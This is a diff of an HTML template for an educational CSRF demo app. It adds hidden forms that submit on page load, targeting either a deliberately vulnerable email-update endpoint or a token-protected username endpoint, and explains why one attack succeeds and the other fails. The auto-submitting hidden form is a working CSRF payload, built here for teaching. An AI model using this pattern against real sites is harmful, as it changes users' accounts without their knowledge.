@@ -37,36 +37,75 @@
         <h3>What's Happening Behind the Scenes</h3>
     </div>
     <div class="card-body">
+        {% if target_vulnerable %}
         <p>
-            This page contains a hidden form that is automatically submitted when the page loads. The form targets the vulnerable application's email update endpoint.
+            This page contains a hidden form that targets the <strong>vulnerable profile page</strong> when it loads.
         </p>
         <p>
-            If you are currently logged into the vulnerable application, this attack will change your email to <code>hacked@malicious.com</code> without your knowledge or consent.
+            <strong>The attack will succeed</strong> because the vulnerable endpoint has no CSRF protection.
+            When you return to the vulnerable profile page, you'll see that your email has been changed to <code>hacked@malicious.com</code>.
         </p>
         <p>
-            However, the attack will only succeed against the <a href="{{ url_for('profile') }}" target="_blank">vulnerable profile page</a>. 
-            It will fail against the <a href="{{ url_for('profile_protected') }}" target="_blank">protected profile page</a> because the protected page requires a valid CSRF token.
+            This demonstrates how easily a CSRF attack can succeed when proper protections are not in place.
+        </p>
+        {% endif %}
+        
+        {% if target_protected %}
+        <p>
+            This page contains a hidden form that targets the <strong>protected profile page</strong> when it loads.
         </p>
         <p>
+            <strong>The attack will fail</strong> because the protected endpoint requires a valid CSRF token, which this malicious site does not have.
+            When you return to the protected profile page, you'll see that your username remains unchanged and an attack notification will be displayed.
+        </p>
+        <p>
+            This demonstrates how CSRF tokens effectively protect against cross-site request forgery attacks.
+        </p>
+        {% endif %}
+        
+        <div class="mt-4">
+            <p>Try both versions to see the difference:</p>
+            <div class="btn-group" role="group">
+                <a href="{{ url_for('malicious_site') }}" class="btn {% if target_vulnerable %}btn-danger{% else %}btn-outline-danger{% endif %}">Attack Vulnerable Page</a>
+                <a href="{{ url_for('malicious_site_protected') }}" class="btn {% if target_protected %}btn-danger{% else %}btn-outline-danger{% endif %}">Attack Protected Page</a>
+            </div>
+        </div>
+        
+        <p class="mt-3">
             <a href="{{ url_for('csrf_demo') }}" class="btn btn-info">Back to CSRF Demo</a>
         </p>
     </div>
 </div>
 
-<!-- Hidden form that gets auto-submitted -->
-<form id="csrf-form" action="{{ url_for('update_email', _external=True) }}" method="POST" style="display: none;">
+<!-- Hidden forms that get auto-submitted -->
+{% if target_vulnerable %}
+<form id="csrf-attack-form" action="{{ url_for('update_email', _external=True) }}" method="POST" style="display: none;">
     <input type="email" name="email" value="hacked@malicious.com">
 </form>
+{% endif %}
+
+{% if target_protected %}
+<form id="csrf-attack-form" action="{{ url_for('update_username_protected', _external=True) }}" method="POST" style="display: none;">
+    <input type="text" name="username" value="hacked_username">
+    <!-- Missing CSRF token - this is why the attack will fail -->
+</form>
+{% endif %}
 
 <!-- JavaScript to auto-submit the form -->
 <script>
     // Auto-submit the form when the page loads
     window.onload = function() {
         // Show an alert to explain what's happening (in a real attack, this wouldn't be shown)
-        alert("This page contains a hidden form that will be automatically submitted.\n\nIf you are logged into the vulnerable application, this will change your email to 'hacked@malicious.com' without your consent.\n\nClick OK to proceed with the demonstration.");
+        {% if target_vulnerable %}
+        alert("This page contains a hidden form that will be automatically submitted.\n\nIt targets the vulnerable endpoint and will change your email to 'hacked@malicious.com' without your consent.\n\nClick OK to proceed with the demonstration.");
+        {% endif %}
+        
+        {% if target_protected %}
+        alert("This page contains a hidden form that will be automatically submitted.\n\nIt targets the protected endpoint and tries to change your username to 'hacked_username'.\n\nThe attack will fail because it lacks a valid CSRF token.\n\nClick OK to proceed with the demonstration.");
+        {% endif %}
         
         // Submit the form
-        document.getElementById('csrf-form').submit();
+        document.getElementById('csrf-attack-form').submit();
     };
 </script>
 {% endblock %} 
